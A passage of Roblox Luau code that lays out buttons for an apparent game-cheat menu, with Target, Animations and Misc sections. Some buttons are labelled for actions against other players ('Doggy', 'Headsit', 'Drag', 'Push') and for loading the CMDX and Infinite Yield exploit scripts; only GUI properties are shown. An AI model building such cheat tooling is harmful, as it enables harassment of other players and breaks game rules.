PushTarget_Button.Name = "PushTarget_Button"
PushTarget_Button.Parent = Target_Section
PushTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PushTarget_Button.BackgroundTransparency = 0.500
PushTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PushTarget_Button.BorderSizePixel = 0
PushTarget_Button.Position = UDim2.new(0, 25, 0, 400)
PushTarget_Button.Size = UDim2.new(0, 150, 0, 30)
PushTarget_Button.Font = Enum.Font.Oswald
PushTarget_Button.Text = "Push"
PushTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PushTarget_Button.TextScaled = true
PushTarget_Button.TextSize = 14.000
PushTarget_Button.TextWrapped = true

WhitelistTarget_Button.Name = "WhitelistTarget_Button"
WhitelistTarget_Button.Parent = Target_Section
WhitelistTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
WhitelistTarget_Button.BackgroundTransparency = 0.500
WhitelistTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
WhitelistTarget_Button.BorderSizePixel = 0
WhitelistTarget_Button.Position = UDim2.new(0, 210, 0, 400)
WhitelistTarget_Button.Size = UDim2.new(0, 150, 0, 30)
WhitelistTarget_Button.Font = Enum.Font.Oswald
WhitelistTarget_Button.Text = "Whitelist"
WhitelistTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
WhitelistTarget_Button.TextScaled = true
WhitelistTarget_Button.TextSize = 14.000
WhitelistTarget_Button.TextWrapped = true

TeleportTarget_Button.Name = "TeleportTarget_Button"
TeleportTarget_Button.Parent = Target_Section
TeleportTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
TeleportTarget_Button.BackgroundTransparency = 0.500
TeleportTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
TeleportTarget_Button.BorderSizePixel = 0
TeleportTarget_Button.Position = UDim2.new(0, 210, 0, 350)
TeleportTarget_Button.Size = UDim2.new(0, 150, 0, 30)
TeleportTarget_Button.Font = Enum.Font.Oswald
TeleportTarget_Button.Text = "Teleport"
TeleportTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
TeleportTarget_Button.TextScaled = true
TeleportTarget_Button.TextSize = 14.000
TeleportTarget_Button.TextWrapped = true

HeadsitTarget_Button.Name = "HeadsitTarget_Button"
HeadsitTarget_Button.Parent = Target_Section
HeadsitTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
HeadsitTarget_Button.BackgroundTransparency = 0.500
HeadsitTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
HeadsitTarget_Button.BorderSizePixel = 0
HeadsitTarget_Button.Position = UDim2.new(0, 210, 0, 250)
HeadsitTarget_Button.Size = UDim2.new(0, 150, 0, 30)
HeadsitTarget_Button.Font = Enum.Font.Oswald
HeadsitTarget_Button.Text = "Headsit"
HeadsitTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
HeadsitTarget_Button.TextScaled = true
HeadsitTarget_Button.TextSize = 14.000
HeadsitTarget_Button.TextWrapped = true

StandTarget_Button.Name = "StandTarget_Button"
StandTarget_Button.Parent = Target_Section
StandTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
StandTarget_Button.BackgroundTransparency = 0.500
StandTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
StandTarget_Button.BorderSizePixel = 0
StandTarget_Button.Position = UDim2.new(0, 25, 0, 250)
StandTarget_Button.Size = UDim2.new(0, 150, 0, 30)
StandTarget_Button.Font = Enum.Font.Oswald
StandTarget_Button.Text = "Stand"
StandTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
StandTarget_Button.TextScaled = true
StandTarget_Button.TextSize = 14.000
StandTarget_Button.TextWrapped = true

BackpackTarget_Button.Name = "BackpackTarget_Button"
BackpackTarget_Button.Parent = Target_Section
BackpackTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
BackpackTarget_Button.BackgroundTransparency = 0.500
BackpackTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
BackpackTarget_Button.BorderSizePixel = 0
BackpackTarget_Button.Position = UDim2.new(0, 210, 0, 300)
BackpackTarget_Button.Size = UDim2.new(0, 150, 0, 30)
BackpackTarget_Button.Font = Enum.Font.Oswald
BackpackTarget_Button.Text = "Backpack"
BackpackTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
BackpackTarget_Button.TextScaled = true
BackpackTarget_Button.TextSize = 14.000
BackpackTarget_Button.TextWrapped = true

DoggyTarget_Button.Name = "DoggyTarget_Button"
DoggyTarget_Button.Parent = Target_Section
DoggyTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
DoggyTarget_Button.BackgroundTransparency = 0.500
DoggyTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
DoggyTarget_Button.BorderSizePixel = 0
DoggyTarget_Button.Position = UDim2.new(0, 25, 0, 300)
DoggyTarget_Button.Size = UDim2.new(0, 150, 0, 30)
DoggyTarget_Button.Font = Enum.Font.Oswald
DoggyTarget_Button.Text = "Doggy"
DoggyTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
DoggyTarget_Button.TextScaled = true
DoggyTarget_Button.TextSize = 14.000
DoggyTarget_Button.TextWrapped = true

DragTarget_Button.Name = "DragTarget_Button"
DragTarget_Button.Parent = Target_Section
DragTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
DragTarget_Button.BackgroundTransparency = 0.500
DragTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
DragTarget_Button.BorderSizePixel = 0
DragTarget_Button.Position = UDim2.new(0, 25, 0, 350)
DragTarget_Button.Size = UDim2.new(0, 150, 0, 30)
DragTarget_Button.Font = Enum.Font.Oswald
DragTarget_Button.Text = "Drag"
DragTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
DragTarget_Button.TextScaled = true
DragTarget_Button.TextSize = 14.000
DragTarget_Button.TextWrapped = true

Animations_Section.Name = "Animations_Section"
Animations_Section.Parent = Background
Animations_Section.Active = true
Animations_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Animations_Section.BackgroundTransparency = 1.000
Animations_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Animations_Section.BorderSizePixel = 0
Animations_Section.Position = UDim2.new(0, 105, 0, 30)
Animations_Section.Size = UDim2.new(0, 395, 0, 320)
Animations_Section.Visible = false
Animations_Section.CanvasSize = UDim2.new(0, 0, 1.6, 0)
Animations_Section.ScrollBarThickness = 5

VampireAnim_Button.Name = "VampireAnim_Button"
VampireAnim_Button.Parent = Animations_Section
VampireAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
VampireAnim_Button.BackgroundTransparency = 0.500
VampireAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
VampireAnim_Button.BorderSizePixel = 0
VampireAnim_Button.Position = UDim2.new(0, 25, 0, 25)
VampireAnim_Button.Size = UDim2.new(0, 150, 0, 30)
VampireAnim_Button.Font = Enum.Font.Oswald
VampireAnim_Button.Text = "Vampire"
VampireAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
VampireAnim_Button.TextScaled = true
VampireAnim_Button.TextSize = 14.000
VampireAnim_Button.TextWrapped = true

HeroAnim_Button.Name = "HeroAnim_Button"
HeroAnim_Button.Parent = Animations_Section
HeroAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
HeroAnim_Button.BackgroundTransparency = 0.500
HeroAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
HeroAnim_Button.BorderSizePixel = 0
HeroAnim_Button.Position = UDim2.new(0, 210, 0, 25)
HeroAnim_Button.Size = UDim2.new(0, 150, 0, 30)
HeroAnim_Button.Font = Enum.Font.Oswald
HeroAnim_Button.Text = "Hero"
HeroAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
HeroAnim_Button.TextScaled = true
HeroAnim_Button.TextSize = 14.000
HeroAnim_Button.TextWrapped = true

ZombieClassicAnim_Button.Name = "ZombieClassicAnim_Button"
ZombieClassicAnim_Button.Parent = Animations_Section
ZombieClassicAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ZombieClassicAnim_Button.BackgroundTransparency = 0.500
ZombieClassicAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ZombieClassicAnim_Button.BorderSizePixel = 0
ZombieClassicAnim_Button.Position = UDim2.new(0, 25, 0, 75)
ZombieClassicAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ZombieClassicAnim_Button.Font = Enum.Font.Oswald
ZombieClassicAnim_Button.Text = "Zombie Classic"
ZombieClassicAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ZombieClassicAnim_Button.TextScaled = true
ZombieClassicAnim_Button.TextSize = 14.000
ZombieClassicAnim_Button.TextWrapped = true

MageAnim_Button.Name = "MageAnim_Button"
MageAnim_Button.Parent = Animations_Section
MageAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
MageAnim_Button.BackgroundTransparency = 0.500
MageAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
MageAnim_Button.BorderSizePixel = 0
MageAnim_Button.Position = UDim2.new(0, 210, 0, 75)
MageAnim_Button.Size = UDim2.new(0, 150, 0, 30)
MageAnim_Button.Font = Enum.Font.Oswald
MageAnim_Button.Text = "Mage"
MageAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
MageAnim_Button.TextScaled = true
MageAnim_Button.TextSize = 14.000
MageAnim_Button.TextWrapped = true

GhostAnim_Button.Name = "GhostAnim_Button"
GhostAnim_Button.Parent = Animations_Section
GhostAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
GhostAnim_Button.BackgroundTransparency = 0.500
GhostAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
GhostAnim_Button.BorderSizePixel = 0
GhostAnim_Button.Position = UDim2.new(0, 25, 0, 125)
GhostAnim_Button.Size = UDim2.new(0, 150, 0, 30)
GhostAnim_Button.Font = Enum.Font.Oswald
GhostAnim_Button.Text = "Ghost"
GhostAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
GhostAnim_Button.TextScaled = true
GhostAnim_Button.TextSize = 14.000
GhostAnim_Button.TextWrapped = true

ElderAnim_Button.Name = "ElderAnim_Button"
ElderAnim_Button.Parent = Animations_Section
ElderAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ElderAnim_Button.BackgroundTransparency = 0.500
ElderAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ElderAnim_Button.BorderSizePixel = 0
ElderAnim_Button.Position = UDim2.new(0, 210, 0, 125)
ElderAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ElderAnim_Button.Font = Enum.Font.Oswald
ElderAnim_Button.Text = "Elder"
ElderAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ElderAnim_Button.TextScaled = true
ElderAnim_Button.TextSize = 14.000
ElderAnim_Button.TextWrapped = true

LevitationAnim_Button.Name = "LevitationAnim_Button"
LevitationAnim_Button.Parent = Animations_Section
LevitationAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
LevitationAnim_Button.BackgroundTransparency = 0.500
LevitationAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
LevitationAnim_Button.BorderSizePixel = 0
LevitationAnim_Button.Position = UDim2.new(0, 25, 0, 175)
LevitationAnim_Button.Size = UDim2.new(0, 150, 0, 30)
LevitationAnim_Button.Font = Enum.Font.Oswald
LevitationAnim_Button.Text = "Levitation"
LevitationAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
LevitationAnim_Button.TextScaled = true
LevitationAnim_Button.TextSize = 14.000
LevitationAnim_Button.TextWrapped = true

AstronautAnim_Button.Name = "AstronautAnim_Button"
AstronautAnim_Button.Parent = Animations_Section
AstronautAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AstronautAnim_Button.BackgroundTransparency = 0.500
AstronautAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AstronautAnim_Button.BorderSizePixel = 0
AstronautAnim_Button.Position = UDim2.new(0, 210, 0, 175)
AstronautAnim_Button.Size = UDim2.new(0, 150, 0, 30)
AstronautAnim_Button.Font = Enum.Font.Oswald
AstronautAnim_Button.Text = "Astronaut"
AstronautAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AstronautAnim_Button.TextScaled = true
AstronautAnim_Button.TextSize = 14.000
AstronautAnim_Button.TextWrapped = true

NinjaAnim_Button.Name = "NinjaAnim_Button"
NinjaAnim_Button.Parent = Animations_Section
NinjaAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
NinjaAnim_Button.BackgroundTransparency = 0.500
NinjaAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
NinjaAnim_Button.BorderSizePixel = 0
NinjaAnim_Button.Position = UDim2.new(0, 25, 0, 225)
NinjaAnim_Button.Size = UDim2.new(0, 150, 0, 30)
NinjaAnim_Button.Font = Enum.Font.Oswald
NinjaAnim_Button.Text = "Ninja"
NinjaAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
NinjaAnim_Button.TextScaled = true
NinjaAnim_Button.TextSize = 14.000
NinjaAnim_Button.TextWrapped = true

WerewolfAnim_Button.Name = "WerewolfAnim_Button"
WerewolfAnim_Button.Parent = Animations_Section
WerewolfAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
WerewolfAnim_Button.BackgroundTransparency = 0.500
WerewolfAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
WerewolfAnim_Button.BorderSizePixel = 0
WerewolfAnim_Button.Position = UDim2.new(0, 210, 0, 225)
WerewolfAnim_Button.Size = UDim2.new(0, 150, 0, 30)
WerewolfAnim_Button.Font = Enum.Font.Oswald
WerewolfAnim_Button.Text = "Werewolf"
WerewolfAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
WerewolfAnim_Button.TextScaled = true
WerewolfAnim_Button.TextSize = 14.000
WerewolfAnim_Button.TextWrapped = true

CartoonAnim_Button.Name = "CartoonAnim_Button"
CartoonAnim_Button.Parent = Animations_Section
CartoonAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CartoonAnim_Button.BackgroundTransparency = 0.500
CartoonAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CartoonAnim_Button.BorderSizePixel = 0
CartoonAnim_Button.Position = UDim2.new(0, 25, 0, 275)
CartoonAnim_Button.Size = UDim2.new(0, 150, 0, 30)
CartoonAnim_Button.Font = Enum.Font.Oswald
CartoonAnim_Button.Text = "Cartoon"
CartoonAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CartoonAnim_Button.TextScaled = true
CartoonAnim_Button.TextSize = 14.000
CartoonAnim_Button.TextWrapped = true

PirateAnim_Button.Name = "PirateAnim_Button"
PirateAnim_Button.Parent = Animations_Section
PirateAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PirateAnim_Button.BackgroundTransparency = 0.500
PirateAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PirateAnim_Button.BorderSizePixel = 0
PirateAnim_Button.Position = UDim2.new(0, 210, 0, 275)
PirateAnim_Button.Size = UDim2.new(0, 150, 0, 30)
PirateAnim_Button.Font = Enum.Font.Oswald
PirateAnim_Button.Text = "Pirate"
PirateAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PirateAnim_Button.TextScaled = true
PirateAnim_Button.TextSize = 14.000
PirateAnim_Button.TextWrapped = true

SneakyAnim_Button.Name = "SneakyAnim_Button"
SneakyAnim_Button.Parent = Animations_Section
SneakyAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SneakyAnim_Button.BackgroundTransparency = 0.500
SneakyAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SneakyAnim_Button.BorderSizePixel = 0
SneakyAnim_Button.Position = UDim2.new(0, 25, 0, 325)
SneakyAnim_Button.Size = UDim2.new(0, 150, 0, 30)
SneakyAnim_Button.Font = Enum.Font.Oswald
SneakyAnim_Button.Text = "Sneaky"
SneakyAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SneakyAnim_Button.TextScaled = true
SneakyAnim_Button.TextSize = 14.000
SneakyAnim_Button.TextWrapped = true

ToyAnim_Button.Name = "ToyAnim_Button"
ToyAnim_Button.Parent = Animations_Section
ToyAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ToyAnim_Button.BackgroundTransparency = 0.500
ToyAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ToyAnim_Button.BorderSizePixel = 0
ToyAnim_Button.Position = UDim2.new(0, 210, 0, 325)
ToyAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ToyAnim_Button.Font = Enum.Font.Oswald
ToyAnim_Button.Text = "Toy"
ToyAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ToyAnim_Button.TextScaled = true
ToyAnim_Button.TextSize = 14.000
ToyAnim_Button.TextWrapped = true

KnightAnim_Button.Name = "KnightAnim_Button"
KnightAnim_Button.Parent = Animations_Section
KnightAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
KnightAnim_Button.BackgroundTransparency = 0.500
KnightAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
KnightAnim_Button.BorderSizePixel = 0
KnightAnim_Button.Position = UDim2.new(0, 25, 0, 375)
KnightAnim_Button.Size = UDim2.new(0, 150, 0, 30)
KnightAnim_Button.Font = Enum.Font.Oswald
KnightAnim_Button.Text = "Knight"
KnightAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
KnightAnim_Button.TextScaled = true
KnightAnim_Button.TextSize = 14.000
KnightAnim_Button.TextWrapped = true

ConfidentAnim_Button.Name = "ConfidentAnim_Button"
ConfidentAnim_Button.Parent = Animations_Section
ConfidentAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ConfidentAnim_Button.BackgroundTransparency = 0.500
ConfidentAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ConfidentAnim_Button.BorderSizePixel = 0
ConfidentAnim_Button.Position = UDim2.new(0, 210, 0, 375)
ConfidentAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ConfidentAnim_Button.Font = Enum.Font.Oswald
ConfidentAnim_Button.Text = "Confident"
ConfidentAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ConfidentAnim_Button.TextScaled = true
ConfidentAnim_Button.TextSize = 14.000
ConfidentAnim_Button.TextWrapped = true

PopstarAnim_Button.Name = "PopstarAnim_Button"
PopstarAnim_Button.Parent = Animations_Section
PopstarAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PopstarAnim_Button.BackgroundTransparency = 0.500
PopstarAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PopstarAnim_Button.BorderSizePixel = 0
PopstarAnim_Button.Position = UDim2.new(0, 25, 0, 425)
PopstarAnim_Button.Size = UDim2.new(0, 150, 0, 30)
PopstarAnim_Button.Font = Enum.Font.Oswald
PopstarAnim_Button.Text = "Popstar"
PopstarAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PopstarAnim_Button.TextScaled = true
PopstarAnim_Button.TextSize = 14.000
PopstarAnim_Button.TextWrapped = true

PrincessAnim_Button.Name = "PrincessAnim_Button"
PrincessAnim_Button.Parent = Animations_Section
PrincessAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PrincessAnim_Button.BackgroundTransparency = 0.500
PrincessAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PrincessAnim_Button.BorderSizePixel = 0
PrincessAnim_Button.Position = UDim2.new(0, 210, 0, 425)
PrincessAnim_Button.Size = UDim2.new(0, 150, 0, 30)
PrincessAnim_Button.Font = Enum.Font.Oswald
PrincessAnim_Button.Text = "Princess"
PrincessAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PrincessAnim_Button.TextScaled = true
PrincessAnim_Button.TextSize = 14.000
PrincessAnim_Button.TextWrapped = true

CowboyAnim_Button.Name = "CowboyAnim_Button"
CowboyAnim_Button.Parent = Animations_Section
CowboyAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CowboyAnim_Button.BackgroundTransparency = 0.500
CowboyAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CowboyAnim_Button.BorderSizePixel = 0
CowboyAnim_Button.Position = UDim2.new(0, 25, 0, 475)
CowboyAnim_Button.Size = UDim2.new(0, 150, 0, 30)
CowboyAnim_Button.Font = Enum.Font.Oswald
CowboyAnim_Button.Text = "Cowboy"
CowboyAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CowboyAnim_Button.TextScaled = true
CowboyAnim_Button.TextSize = 14.000
CowboyAnim_Button.TextWrapped = true

PatrolAnim_Button.Name = "PatrolAnim_Button"
PatrolAnim_Button.Parent = Animations_Section
PatrolAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PatrolAnim_Button.BackgroundTransparency = 0.500
PatrolAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PatrolAnim_Button.BorderSizePixel = 0
PatrolAnim_Button.Position = UDim2.new(0, 210, 0, 475)
PatrolAnim_Button.Size = UDim2.new(0, 150, 0, 30)
PatrolAnim_Button.Font = Enum.Font.Oswald
PatrolAnim_Button.Text = "Patrol"
PatrolAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PatrolAnim_Button.TextScaled = true
PatrolAnim_Button.TextSize = 14.000
PatrolAnim_Button.TextWrapped = true

ZombieFEAnim_Button.Name = "ZombieFEAnim_Button"
ZombieFEAnim_Button.Parent = Animations_Section
ZombieFEAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ZombieFEAnim_Button.BackgroundTransparency = 0.500
ZombieFEAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ZombieFEAnim_Button.BorderSizePixel = 0
ZombieFEAnim_Button.Position = UDim2.new(0, 25, 0, 525)
ZombieFEAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ZombieFEAnim_Button.Font = Enum.Font.Oswald
ZombieFEAnim_Button.Text = "FE Zombie"
ZombieFEAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ZombieFEAnim_Button.TextScaled = true
ZombieFEAnim_Button.TextSize = 14.000
ZombieFEAnim_Button.TextWrapped = true

Misc_Section.Name = "Misc_Section"
Misc_Section.Parent = Background
Misc_Section.Active = true
Misc_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Misc_Section.BackgroundTransparency = 1.000
Misc_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Misc_Section.BorderSizePixel = 0
Misc_Section.Position = UDim2.new(0, 105, 0, 30)
Misc_Section.Size = UDim2.new(0, 395, 0, 320)
Misc_Section.Visible = false
Misc_Section.CanvasSize = UDim2.new(0, 0, 1.1, 0)
Misc_Section.ScrollBarThickness = 5

AntiFling_Button.Name = "AntiFling_Button"
AntiFling_Button.Parent = Misc_Section
AntiFling_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AntiFling_Button.BackgroundTransparency = 0.500
AntiFling_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiFling_Button.BorderSizePixel = 0
AntiFling_Button.Position = UDim2.new(0, 25, 0, 25)
AntiFling_Button.Size = UDim2.new(0, 150, 0, 30)
AntiFling_Button.Font = Enum.Font.Oswald
AntiFling_Button.Text = "Anti fling"
AntiFling_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiFling_Button.TextScaled = true
AntiFling_Button.TextSize = 14.000
AntiFling_Button.TextWrapped = true

AntiAFK_Button.Name = "AntiAFK_Button"
AntiAFK_Button.Parent = Misc_Section
AntiAFK_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AntiAFK_Button.BackgroundTransparency = 0.500
AntiAFK_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiAFK_Button.BorderSizePixel = 0
AntiAFK_Button.Position = UDim2.new(0, 25, 0, 75)
AntiAFK_Button.Size = UDim2.new(0, 150, 0, 30)
AntiAFK_Button.Font = Enum.Font.Oswald
AntiAFK_Button.Text = "Anti AFK"
AntiAFK_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiAFK_Button.TextScaled = true
AntiAFK_Button.TextSize = 14.000
AntiAFK_Button.TextWrapped = true

AntiChatSpy_Button.Name = "AntiChatSpy_Button"
AntiChatSpy_Button.Parent = Misc_Section
AntiChatSpy_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AntiChatSpy_Button.BackgroundTransparency = 0.500
AntiChatSpy_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiChatSpy_Button.BorderSizePixel = 0
AntiChatSpy_Button.Position = UDim2.new(0, 210, 0, 25)
AntiChatSpy_Button.Size = UDim2.new(0, 150, 0, 30)
AntiChatSpy_Button.Font = Enum.Font.Oswald
AntiChatSpy_Button.Text = "Anti chat spy"
AntiChatSpy_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiChatSpy_Button.TextScaled = true
AntiChatSpy_Button.TextSize = 14.000
AntiChatSpy_Button.TextWrapped = true

Shaders_Button.Name = "Shaders_Button"
Shaders_Button.Parent = Misc_Section
Shaders_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Shaders_Button.BackgroundTransparency = 0.500
Shaders_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Shaders_Button.BorderSizePixel = 0
Shaders_Button.Position = UDim2.new(0, 210, 0, 75)
Shaders_Button.Size = UDim2.new(0, 150, 0, 30)
Shaders_Button.Font = Enum.Font.Oswald
Shaders_Button.Text = "Shaders"
Shaders_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Shaders_Button.TextScaled = true
Shaders_Button.TextSize = 14.000
Shaders_Button.TextWrapped = true

Day_Button.Name = "Day_Button"
Day_Button.Parent = Misc_Section
Day_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Day_Button.BackgroundTransparency = 0.500
Day_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Day_Button.BorderSizePixel = 0
Day_Button.Position = UDim2.new(0, 25, 0, 125)
Day_Button.Size = UDim2.new(0, 150, 0, 30)
Day_Button.Font = Enum.Font.Oswald
Day_Button.Text = "Day"
Day_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Day_Button.TextScaled = true
Day_Button.TextSize = 14.000
Day_Button.TextWrapped = true

Night_Button.Name = "Night_Button"
Night_Button.Parent = Misc_Section
Night_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Night_Button.BackgroundTransparency = 0.500
Night_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Night_Button.BorderSizePixel = 0
Night_Button.Position = UDim2.new(0, 210, 0, 125)
Night_Button.Size = UDim2.new(0, 150, 0, 30)
Night_Button.Font = Enum.Font.Oswald
Night_Button.Text = "Night"
Night_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Night_Button.TextScaled = true
Night_Button.TextSize = 14.000
Night_Button.TextWrapped = true

Explode_Button.Name = "Explode_Button"
Explode_Button.Parent = Misc_Section
Explode_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Explode_Button.BackgroundTransparency = 0.500
Explode_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Explode_Button.BorderSizePixel = 0
Explode_Button.Position = UDim2.new(0, 25, 0, 225)
Explode_Button.Size = UDim2.new(0, 150, 0, 30)
Explode_Button.Font = Enum.Font.Oswald
Explode_Button.Text = "Explode"
Explode_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Explode_Button.TextScaled = true
Explode_Button.TextSize = 14.000
Explode_Button.TextWrapped = true

Rejoin_Button.Name = "Rejoin_Button"
Rejoin_Button.Parent = Misc_Section
Rejoin_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Rejoin_Button.BackgroundTransparency = 0.500
Rejoin_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Rejoin_Button.BorderSizePixel = 0
Rejoin_Button.Position = UDim2.new(0, 25, 0, 275)
Rejoin_Button.Size = UDim2.new(0, 150, 0, 30)
Rejoin_Button.Font = Enum.Font.Oswald
Rejoin_Button.Text = "Rejoin"
Rejoin_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Rejoin_Button.TextScaled = true
Rejoin_Button.TextSize = 14.000
Rejoin_Button.TextWrapped = true

CMDX_Button.Name = "CMDX_Button"
CMDX_Button.Parent = Misc_Section
CMDX_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CMDX_Button.BackgroundTransparency = 0.500
CMDX_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CMDX_Button.BorderSizePixel = 0
CMDX_Button.Position = UDim2.new(0, 210, 0, 175)
CMDX_Button.Size = UDim2.new(0, 150, 0, 30)
CMDX_Button.Font = Enum.Font.Oswald
CMDX_Button.Text = "CMDX"
CMDX_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CMDX_Button.TextScaled = true
CMDX_Button.TextSize = 14.000
CMDX_Button.TextWrapped = true

InfYield_Button.Name = "InfYield_Button"
InfYield_Button.Parent = Misc_Section
InfYield_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
InfYield_Button.BackgroundTransparency = 0.500
InfYield_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
InfYield_Button.BorderSizePixel = 0
InfYield_Button.Position = UDim2.new(0, 25, 0, 175)
InfYield_Button.Size = UDim2.new(0, 150, 0, 30)
